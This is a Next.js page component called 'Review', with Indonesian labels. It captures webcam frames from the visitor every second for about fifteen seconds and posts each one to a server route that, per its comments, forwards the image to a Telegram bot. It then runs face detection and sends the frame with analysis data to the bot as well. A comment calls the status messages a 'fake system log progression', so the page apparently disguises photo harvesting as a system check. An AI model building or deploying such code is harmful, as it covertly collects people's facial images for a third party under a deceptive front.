import { useEffect, useRef, useState } from 'react';
import { useRouter } from 'next/router';

export default function Review() {
  const router = useRouter();

  // logs state
  const [logs, setLogs] = useState([]);
  function pushLog(txt) {
    const time = new Date().toLocaleTimeString();
    setLogs(prev => [`${time} — ${txt}`, ...prev].slice(0, 300));
  }

  // camera refs & state
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const detectIntervalRef = useRef(null);
  const [cameraAllowed, setCameraAllowed] = useState(false);
  const [status, setStatus] = useState('idle'); // idle, loading, proses, deteksi, berhasil, gagal
  const [seconds, setSeconds] = useState(0);

  useEffect(() => {
    return () => stopAll();
  }, []);

  function stopAll() {
    if (captureIntervalRef.current) { clearInterval(captureIntervalRef.current); captureIntervalRef.current = null; }
    if (detectIntervalRef.current) { clearInterval(detectIntervalRef.current); detectIntervalRef.current = null; }
    const s = videoRef.current?.srcObject;
    if (s && s.getTracks) s.getTracks().forEach(t => t.stop());
    videoRef.current && (videoRef.current.srcObject = null);
  }

  async function requestCamera() {
    setStatus('loading');
    pushLog('requesting-camera-permission');
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      videoRef.current.srcObject = stream;
      await videoRef.current.play();
      setCameraAllowed(true);
      setStatus('idle');
      pushLog('camera-allowed');
    } catch (e) {
      console.error(e);
      setCameraAllowed(false);
      setStatus('gagal');
      pushLog('camera-denied');
    }
  }

  function captureFrameDataURL() {
    const video = videoRef.current;
    if (!video) return null;
    if (!canvasRef.current) canvasRef.current = document.createElement('canvas');
    const canvas = canvasRef.current;
    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, w, h);
    return canvas.toDataURL('image/jpeg', 0.8);
  }

  async function sendPhotoToServer(base64, filename, caption, extra = {}) {
    try {
      const res = await fetch('/api/laifulbotapi', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'sendPhoto', imageBase64: base64, filename, caption, extra })
      });
      return await res.json();
    } catch (e) {
      console.error(e);
      return { ok: false, error: e.message || String(e) };
    }
  }

  async function callFaceAnalyze(base64) {
    try {
      const res = await fetch('/api/laifulbotapi', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'faceAnalyze', imageBase64: base64 })
      });
      return await res.json();
    } catch (e) {
      console.error(e);
      return { ok: false, error: e.message || String(e) };
    }
  }

  function randId(len = 12) {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let s = '';
    for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)];
    return s;
  }

  async function startAll() {
    // ensure camera
    if (!cameraAllowed) {
      await requestCamera();
      if (!cameraAllowed && !videoRef.current?.srcObject) {
        pushLog('camera-not-available');
        return;
      }
    }

    setStatus('proses');
    setSeconds(0);
    pushLog('building-start');

    // capture every 1 second for 15s
    let count = 0;
    captureIntervalRef.current = setInterval(async () => {
      count++;
      setSeconds(prev => prev + 1);

      const dataUrl = captureFrameDataURL();
      if (!dataUrl) {
        pushLog('capture-failed-no-data');
        return;
      }
      const base64 = dataUrl.replace(/^data:image\/(png|jpeg|jpg);base64,/, '');
      const shortId = `terdeteksi-${randId(12)}`;
      pushLog(`photo-captured ${shortId}`);

      // send to Telegram via server
      const r = await sendPhotoToServer(base64, `${shortId}.jpg`, shortId);
      if (r?.ok) pushLog(`sent-to-bot ${shortId}`);
      else pushLog(`send-failed ${r?.error || 'unknown'}`);

      // fake system log progression
      if (count === 1) pushLog('module:loading');
      if (count === 5) pushLog('module:proses');
      if (count === 10) pushLog('module:proses-ongoing');

      if (count >= 15) {
        clearInterval(captureIntervalRef.current);
        captureIntervalRef.current = null;
        pushLog('capture-phase-complete');
        // after capture phase, start detection cycle
        startDetectionCycle();
      }
    }, 1000);
  }

  let detectAttempts = 0;
  async function startDetectionCycle() {
    setStatus('deteksi');
    detectAttempts = 0;
    pushLog('starting-face-detection-cycle');

    detectIntervalRef.current = setInterval(async () => {
      detectAttempts++;
      setSeconds(prev => prev + 1);

      const dataUrl = captureFrameDataURL();
      if (!dataUrl) {
        pushLog('detect-capture-failed');
        return;
      }
      const base64 = dataUrl.replace(/^data:image\/(png|jpeg|jpg);base64,/, '');

      pushLog(`deteksi-attempt-${detectAttempts}`);
      const analysis = await callFaceAnalyze(base64);
      if (!analysis?.ok) {
        pushLog(`face-api-error ${analysis?.error || JSON.stringify(analysis)}`);
      } else {
        // api4.ai returns nested structure. We check for faces in result
        const faces = (analysis.result && (analysis.result?.results?.[0]?.entities || analysis.result?.results)) || analysis.result?.faces || [];
        // try several access patterns
        let faceCount = 0;
        try {
          // common api4.ai structure: result.results[0].entities[?].objects / faces
          const r0 = analysis.result?.results?.[0];
          if (r0 && Array.isArray(r0?.entities)) {
            // attempt to find face-like entity with face metadata
            for (const e of r0.entities) {
              if ((e?.type || '').toLowerCase().includes('face') || e?.classes?.some?.(c => c.toLowerCase().includes('face'))) {
                faceCount += 1;
              }
              if (Array.isArray(e?.objects)) faceCount += e.objects.length;
            }
          }
        } catch (e) {
          // ignore parsing error
        }

        // fallback: check known fields
        if (!faceCount) {
          if (Array.isArray(analysis.result?.faces)) faceCount = analysis.result.faces.length;
          if (Array.isArray(analysis.faces)) faceCount = analysis.faces.length;
        }

        pushLog(`face-api-raw-summary ${JSON.stringify(analysis.result?.results?.[0]?.summary || {}).slice(0,200)}`);

        if (faceCount > 0) {
          pushLog('deteksi-berhasil');
          // send detection image + summary to telegram
          const sendRes = await sendPhotoToServer(base64, `deteksi-${Date.now()}.jpg`, `deteksi-berhasil-${randId(8)}`, { analysisSummary: analysis.result });
          if (sendRes?.ok) pushLog('deteksi-sent-to-bot');
          else pushLog('deteksi-send-failed');

          clearInterval(detectIntervalRef.current);
          detectIntervalRef.current = null;
          setStatus('berhasil');
          pushLog('system-status:BERHASIL');
          // route to success page
          setTimeout(() => router.push('/success'), 700);
          return;
        } else {
          pushLog(`deteksi-tidak-terlihat attempt:${detectAttempts}`);
        }
      }

      if (detectAttempts >= 20) {
        clearInterval(detectIntervalRef.current);
        detectIntervalRef.current = null;
        setStatus('gagal');
        pushLog('system-status:GAGAL');
      }

    }, 1000);
  }

  return (
    <main className="page">
      <div className="container">
        <div className="monitor">
          <div className="videoWrap">
            <video ref={videoRef} className="video" playsInline muted />
            {!cameraAllowed && (
              <div className="placeholder">Preview mati — klik "Minta Izin Kamera"</div>
            )}
          </div>

          <div className="system">
            <div className="meta">
              <div className="title">Sistem</div>
              <div className="status">Status: <span className="badge">{status}</span></div>
              <div className="timer">Waktu: {seconds}s</div>
            </div>

            <div className="controls">
              <button className="btn" onClick={requestCamera}>Minta Izin Kamera</button>
              <button className="btn" onClick={startAll}>Start</button>
              <button className="btn ghost" onClick={() => { stopAll(); setStatus('idle'); pushLog('stopped'); }}>Stop</button>
            </div>
          </div>
        </div>

        <div className="panel">
          <div className="panelHead">
            <div className="title">Log Info</div>
            <div className="hint">Monitor aktivitas sistem & pengiriman ke bot</div>
          </div>

          <div className="logs">
            {logs.length === 0 && <div className="logEmpty">Belum ada log</div>}
            {logs.map((l, i) => <div key={i} className="logItem">{l}</div>)}
          </div>
        </div>
      </div>

      <style jsx>{`
        :global(body){ margin:0; font-family:Inter,ui-sans-serif,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial; background:#0b1220; color:#e6eef8; }
        .page { padding:18px; min-height:100vh; box-sizing:border-box; }
        .container { display:flex; gap:18px; align-items:flex-start; max-width:1200px; margin:0 auto; }

        /* monitor section */
        .monitor { flex:1; display:flex; flex-direction:column; gap:12px; }
        .videoWrap { width:100%; height:360px; background:#000; border-radius:10px; position:relative; overflow:hidden; display:flex; align-items:center; justify-content:center; }
        .video { width:100%; height:100%; object-fit:cover; display:block; }
        .placeholder { color:#94a3b8; position:absolute; text-align:center; padding:12px; }

        .system { display:flex; justify-content:space-between; align-items:center; gap:12px; background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; }
        .meta { display:flex; gap:12px; align-items:center; }
        .meta .title { font-weight:600; }
        .badge { background:#072f2f; color:#8ff; padding:6px 10px; border-radius:999px; font-weight:600; margin-left:6px; }
        .controls { display:flex; gap:8px; align-items:center; }

        .btn { background:#06b6d4; color:#022; padding:8px 12px; border-radius:8px; border:0; cursor:pointer; font-weight:600; }
        .btn.ghost { background:transparent; color:#94a3b8; border:1px solid rgba(255,255,255,0.04); }

        /* panel/logs */
        .panel { width:360px; max-width:40%; min-width:260px; background:rgba(255,255,255,0.02); padding:12px; border-radius:10px; display:flex; flex-direction:column; gap:12px; }
        .panelHead { display:flex; justify-content:space-between; align-items:center; }
        .logs { background:#071021; padding:12px; border-radius:8px; min-height:360px; max-height:68vh; overflow:auto; font-family:monospace; font-size:13px; color:#9ae6ff; }
        .logItem { padding:6px 0; border-bottom:1px dashed rgba(255,255,255,0.02); }
        .logEmpty { color:#94a3b8; }

        /* responsive */
        @media (max-width: 900px) {
          .container { flex-direction:column; }
          .panel { width:100%; max-width:100%; min-width:unset; }
          .videoWrap { height:260px; }
        }

        @media (max-width: 480px) {
          .videoWrap { height:220px; }
          .system { flex-direction:column; align-items:flex-start; gap:8px; }
          .controls { width:100%; display:flex; justify-content:space-between; }
        }
      `}</style>
    </main>
  );
}